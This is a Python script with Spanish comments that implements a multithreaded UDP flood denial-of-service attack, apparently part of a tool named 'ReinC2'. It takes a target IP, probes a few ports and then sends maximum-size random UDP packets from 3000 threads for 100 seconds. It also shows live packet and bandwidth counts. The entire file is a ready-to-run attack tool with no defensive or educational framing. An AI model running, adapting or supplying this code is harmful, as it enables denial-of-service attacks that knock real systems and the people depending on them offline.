import socket
import threading
import time
import random
import os

# 💥 Configuración automática
ip = input("🎯 IP objetivo: ").strip()
duration = 100
threads = 3000
packet_size = 65507
payload = random._urandom(packet_size)
timeout = time.time() + duration

total_packets = 0
lock = threading.Lock()

# 🔍 Escaneo de puertos
def scan_ports(ip):
    common_ports = [22, 53]
    print(f"🔍 Escaneando puertos comunes en {ip}...")
    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                print(f"✅ Puerto abierto encontrado: {port}")
                return port
        except:
            continue
    print("❌ No se encontró puerto abierto. Usando 80 por defecto.")
    return 80

# 📊 Monitor de tráfico
def monitor():
    global total_packets
    start_time = time.time()
    last_packets = 0

    while time.time() < timeout:
        time.sleep(1)
        with lock:
            current = total_packets
        pps = current - last_packets
        last_packets = current
        bandwidth_mbps = (pps * packet_size * 8) / (1024 * 1024)

        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed

        os.system('clear' if os.name != 'nt' else 'cls')
        print(f"📡 ReinC2 Layer4 UDP Monitor")
        print(f"{'-'*40}")
        print(f"🧠 IP objetivo     : {ip}")
        print(f"📦 Puerto          : {target_port}")
        print(f"⏱ Tiempo restante : {remaining}s")
        print(f"🧨 PPS actuales    : {pps}")
        print(f"🚀 Ancho de banda  : {bandwidth_mbps:.2f} Mbps")
        print(f"📤 Paquetes enviados: {current}")
        print(f"{'-'*40}")

# 🔫 UDP Flood
def flood():
    global total_packets
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < timeout:
        try:
            sock.sendto(payload, (ip, target_port))
            with lock:
                total_packets += 1
        except:
            pass

# 🧨 Ejecutar
target_port = scan_ports(ip)
print("🔥 Iniciando ataque UDP automático...\n")

for _ in range(threads):
    threading.Thread(target=flood).start()

threading.Thread(target=monitor).start()
